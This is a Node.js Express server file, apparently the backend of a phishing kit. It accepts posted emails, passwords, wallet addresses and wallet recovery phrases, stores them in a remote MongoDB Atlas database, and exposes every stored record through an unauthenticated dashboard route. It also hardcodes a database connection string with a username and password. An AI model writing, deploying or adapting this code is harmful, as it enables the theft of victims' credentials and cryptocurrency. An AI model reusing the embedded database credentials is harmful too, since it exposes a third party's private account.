const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(__dirname));

mongoose.connect("mongodb+srv://scumbag3_db_user:Ihadnopurpose21@cluster0.zisiplb.mongodb.net/leads?retryWrites=true&w=majority")
  .then(() => console.log("Connected to DB"))
  .catch(err => console.error("DB Error:", err));

const leadSchema = new mongoose.Schema({
    email: String,
    password: String,
    walletAddress: String,
    recoveryPhrase: String,
    timestamp: { type: Date, default: Date.now }
});
const Lead = mongoose.model('Lead', leadSchema, 'leads');

app.post('/update', async (req, res) => {
    try {
        const lead = new Lead(req.body);
        await lead.save();
        res.status(200).send("Saved");
    } catch (err) {
        res.status(500).send("Error");
    }
});

app.get('/dashboard', async (req, res) => {
    const leads = await Lead.find().sort({ timestamp: -1 });
    res.json(leads);
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Listening on port ${PORT}`));
